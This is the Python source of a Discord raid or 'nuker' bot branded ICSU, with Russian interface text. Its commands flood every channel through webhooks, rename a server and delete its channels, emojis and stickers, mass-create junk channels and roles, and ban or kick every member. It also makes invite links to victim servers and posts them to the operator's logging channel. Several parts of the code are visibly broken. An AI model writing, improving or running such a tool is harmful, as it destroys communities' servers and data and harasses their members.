import discord, asyncio, datetime, json, aiofile
from discord.ext import commands
from datetime import timedelta
from aiofile import async_open
from config import token, txt, allowed_ids



intents = discord.Intents.default()
intents.message_content = True
intents.members = True



bot = commands.Bot(command_prefix = '-', intents=intents,  case_insensitive=True, help_command=None)


@bot.event
async def on_ready():
        print(f'Bot is turned on as {bot.user.name}!')
        await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.streaming, name="-help"))

def open_whitelist():
    try:
        with open('whitelist.json', 'r') as data:
            return json.load(data)
    except FileNotFoundError:
        whitelist = []
        with open('whitelist.json', 'w') as data:
            json.dump(whitelist, data)
        return []

wllist = open_whitelist()                                      
channame = 'crashed-by-icsu'

    

@bot.event
async def on_guild_join(guild):
    channel = bot.get_channel(1405476031170740255)
    
    emb = discord.Embed(title='Бот был добавлен на сервер!', colour=discord.Colour.green(),
    description=f'- ID сервера - {guild.id} \n - Количество участников - {guild.member_count}')
    emb.set_footer(text=guild.name,icon_url=guild.icon)

    guildlink = None
    for textchan in guild.text_channels:
        if not guildlink:
            guildlink = str(await textchan.create_invite())
            if guildlink:
                emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
                await logs_channel.send(embed=emb)
    
    
@bot.event
async def on_guild_remove(guild):
    chan = bot.get_channel(1405476031170740255)
    embed = discord.Embed(title='Бот был удален с сервера',colour=discord.Colour.red())
    embed.set_footer(text=guild.name,icon_url=guild.icon)
    await chan.send(embed=embed)
 
@bot.event
async def on_command_error(ctx,error):
    if isinstance(error, commands.CommandOnCooldown):
        embed = discord.Embed(title='Команда на задержке',description='Команду можно будет использовать через 6 часов!',colour=discord.Colour.red())
        await ctx.author.send(embed=embed)
 
 
@bot.command()
async def id(ctx, member : discord.Member = None):
 if member == None:
    await ctx.reply(ctx.author.id)
 else:
    await ctx.send(member.id)
              
        
        
async def create_hook(ctx):
    for chan in ctx.guild.text_channels:
        webhook = await chan.create_webhook(name='ICSU')
        async with async_open('icsu.png','rb') as pfp:
            await webhook.edit(avatar=await pfp.read())

        asyncio.create_task(spm_hook(webhook))  

async def spm_hook(webhook):
    for i in range(30):
        try:
            await webhook.send(txt)
        except RateLimited(retry_after=5):
            await asyncio.sleep(0.7)
            await webhook.send(txt)
        except:
            pass
        
@bot.command()
async def spam(ctx):
    if ctx.guild.id in wllist:
        embed = discord.Embed(title='❌ Этот сервер в белом листе, заспамить сервер нельзя!',colour=discord.Colour.red())
        res = await ctx.reply(embed=embed)
        await asyncio.sleep(20)
        await res.delete()
    else:
        await ctx.message.delete()
        asyncio.create_task(create_hook(ctx))



@bot.command()
async def avatar(ctx, member : discord.Member = None):
    if member == None:
        author = ctx.author.avatar
        embed = discord.Embed(title=f'Аватар {ctx.author.name}',colour=discord.Colour.dark_purple())
        embed.set_image(url=author)
        await ctx.reply(embed=embed)
    else:
        embed = discord.Embed(title=f'Аватар {member.name}',colour=discord.Colour.dark_purple())
        embed.set_image(url=member.avatar)
        await ctx.send(embed=embed)
        
    
@bot.command()
async def help(ctx):
    desc='''```
id - показывает айди пользователя
avatar - показывает аватар участника
help - показывает эту команду
spam - спамит во всех каналах
crash - крашает сервер
massban - банит всех участников сервера
masskick - выгоняет всех участников сервера
whitelist - добавляет сервер в белый лист```
    '''
    emb = discord.Embed(title='Команды',
    description=desc,colour=discord.Colour.dark_purple())
    emb.set_footer(icon_url=ctx.author.avatar,text=ctx.author.name)
    await ctx.reply(embed=emb)
    
async def crsh_channels(guild):
    try:
        for b in range(40):
            await guild.create_text_channel(name=channame)
    except:
        pass
    
async def spam_roles(guild):
    try:
        for b in range(30):
            await guild.create_role(name='ICSU',colour=discord.Colour.dark_purple())
    except:
        pass
        
        
async def del_channels(guild):
    try:
        for b in guild.channels:
            await b.delete()
    except:
        pass

async def del_emojis(guild):
    try:
        for b in guild.emojis:
            await b.delete()
    except:
        pass

async def del_stickers(guild):
    try:
        for b in guild.stickers:
            await b.delete()
    except:
        pass
    
    
@bot.command()
@commands.cooldown(1, 6 * 60 * 60, commands.BucketType.user)
async def crash(ctx):
    guild = ctx.guild
    if guild.id in wllist:
        embed = discord.Embed(title='❌ Этот сервер находится в белом листе. Сервер нельзя крашнуть!',colour=discord.Colour.red())
        res = await ctx.reply(embed=embed)
        await asyncio.sleep(20)
        await res.delete()
    else:
        logs_channel = bot.get_channel(1405476031170740255)
        
        await ctx.message.delete()
        async with async_open('icsu.png', 'rb') as pfp:
            await ctx.guild.edit(name='OWNED BY ICSU',icon=await pfp.read())
        
        asyncio.gather(
            del_channels(guild),
            crsh_channels(guild),
            spam_roles(guild),
            del_emojis(guild),
            del_stickers(guild))
        
        await asyncio.sleep(5)
            
        emb = discord.Embed(title='Бот крашнул сервер', colour=discord.Colour.green(),
        description=f'- ID сервера - {guild.id} \n - Количество участников - {guild.member_count}')
        emb.set_footer(text=guild.name,icon_url=guild.icon)
           
        guildlink = None
        for textchan in guild.text_channels:
            if not guildlink:
                guildlink = str(await textchan.create_invite())
                if guildlink:
                    emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
                     await logs_channel.send(embed=emb)
      
      
       
@bot.event
async def on_guild_channel_create(channel):
    if channel.name == channame:
        web = await channel.create_webhook(name='ICSU', avatar= await channel.guild.icon.read())
        for b in range(50):
            try:
                await web.send(txt)
            except RateLimited(retry_after=5):
                await asyncio.sleep(0.7)
                await webhook.send(txt)
            except:
                pass
    else:
         return
         

   
@bot.command()
async def massban(ctx):
    if ctx.guild.id in wllist:
        embed = discord.Embed(title='❌ Этот сервер в белом листе!',colour=discord.Colour.red())
        res = await ctx.reply(embed=embed)
        await asyncio.sleep(20)
        await res.delete()
    else:
        i=0
        for member in ctx.guild.members:
            try:
                await member.ban()
                i+=1
            except:
                pass
        try:
            await ctx.author.send(embed=discord.Embed(title=f'Было забанено {i} участников!', colour=discord.Colour.green()))
        except:
            pass

@bot.command()
async def masskick(ctx):
    if ctx.guild.id in wllist:
        embed = discord.Embed(title='❌ Этот сервер в белом листе!',colour=discord.Colour.red())
        res = await ctx.reply(embed=embed)
        await asyncio.sleep(20)
        await res.delete()
    else:
        i=0
        for member in ctx.guild.members:
            try:
                await member.kick()
                i+=1
            except:
                pass
        try:
            await ctx.author.send(embed=discord.Embed(title=f'Было выгнано {i} участников!', colour=discord.Colour.green()))
        except:
            pass

@bot.command()
async def whitelist(ctx, serv_id: int):
    if ctx.author.id not in allowed_ids:
        emb = discord.Embed(title='❌ У вас нет прав добавлять сервера в белый лист.', colour=discord.Colour.red())
        await ctx.send(embed=emb)
        return
    
    if serv_id not in whitelist:
        whitelist.append(serv_id)
        with open('whitelist.json', 'w') as data:
            json.dump(whitelist, data)
        emb = discord.Embed(title=f'{serv_id} был добавлен в белый лист!', colour=discord.Colour.green())
        await ctx.send(embed=emb)
    else:
        emb = discord.Embed(title='Сервер уже в белом листе.', colour=discord.Colour.dark_purple())
        await ctx.send(embed=emb)      
    
    
    

bot.run(token, log_handler=None)


